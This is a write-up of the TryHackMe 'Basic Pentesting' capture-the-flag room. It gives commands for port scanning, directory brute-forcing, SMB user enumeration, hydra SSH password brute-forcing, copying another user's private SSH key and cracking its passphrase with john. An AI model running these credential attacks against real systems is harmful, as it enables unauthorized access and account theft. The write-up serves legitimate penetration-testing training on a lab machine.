# Basic_Pentesting
Writeup for the Basic Pentesting room on TryHackMe


1. Find the services exposed by the machine

```
nmap -sS -sV -sC MACHINEIP
```
Ports 22, 80, 139, 445, 8009, and 8080 are open

2. What is the name of the hidden directory on the web server(enter name without /)?

```
gobuster dir -u MACHINEIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
```
There is a directory named 'development' with two text files inside.


3. User brute-forcing to find the username & password

Let's take a look at those text files
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

```
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

```
We can see somebody named J has a weak password. We know this machine is running Samba, so lets use enum4linux to try and find this persons username.

```
enum4linux MACHINEIP
```
4. What is the username?

We can see that there are two users named kay and jan.

5. What is the password?

Now that we have a username, we can use hydra to brute-force the password.

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://MACHINEIP
```

6. What service do you use to access the server(answer in abbreviation in all caps)?

We can access the server using ssh
```
ssh jan@MACHINEIP
```

7. Enumerate the machine to find any vectors for privilege escalation

If we cd into kay's directory we see there is a file called pass.bak that we dont have permissions to view.
Let's see if theres anything else...

```
jan@basic2:/home/kay$ ls -la
```
There is a directory called .ssh with kays private RSA key inside
Lets copy and paste this into a new file on our local machine and use it to login as kay.

```
nano kay_rsa
```
```
chmod 600 kay_rsa
```
```
ssh -i kay_rsa kay@MACHINEIP
```
Looks like the key requires a passphrase. Lets see if we can brute-force the passphrase with john.
First we need to create a hash file from the rsa file using ssh2john

```
python ssh2john.py kay_rsa > kay_rsa.hash
```
Now lets use john to crack the hash

```
john kay_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Now we can login as kay and view pass.bak to get the flag!
